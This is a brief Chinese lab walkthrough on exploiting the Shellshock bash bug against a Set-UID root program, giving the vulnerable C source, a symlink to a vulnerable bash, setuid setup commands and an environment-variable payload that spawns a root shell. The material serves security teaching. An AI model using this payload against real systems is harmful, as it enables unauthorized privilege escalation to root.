## 利用Shellshock攻击Set-UID程序

### 1. 准备目标程序

```c
// vul.c

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

void main() {
        setuid(geteuid());
        system("/bin/ls -l");
}
```

### 2. 使/bin/sh指向漏洞版本的bash

```bash
sudo ln -sf /bin/bash_shellshock /bin/sh
```

### 3. 执行攻击

```bahs
# 编译目标程序
gcc vul.c -o vul
# 更改目标程序所有者
sudo chown root vul
# 设置set uid
sudo chmod 4755 vul
# 设置环境变量
export foo='() { echo hello; }; /bin/sh'
# 查看效果
id
```